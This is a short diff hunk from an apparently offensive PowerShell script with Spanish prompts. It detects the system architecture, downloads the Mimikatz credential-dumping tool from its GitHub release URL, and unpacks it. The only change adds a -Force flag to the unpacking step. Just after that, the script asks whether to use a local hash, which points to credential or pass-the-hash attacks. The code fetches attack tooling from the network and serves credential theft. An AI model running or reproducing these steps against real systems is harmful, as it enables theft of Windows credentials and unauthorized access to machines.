@@ -82,7 +82,7 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
 	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
         Write-Host "Sistema de $system detectado, descargando Mimikatz.." -ForegroundColor Green 
 	EnableTLS ; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180820/mimikatz_trunk.zip" -Outfile mimikatz.zip
-	Expand-Archive .\mimikatz.zip
+	Expand-Archive .\mimikatz.zip -Force
 	Write-Host ""
         $hash = Read-Host -Prompt 'Quieres usar un hash local?'
 	Write-Host ""
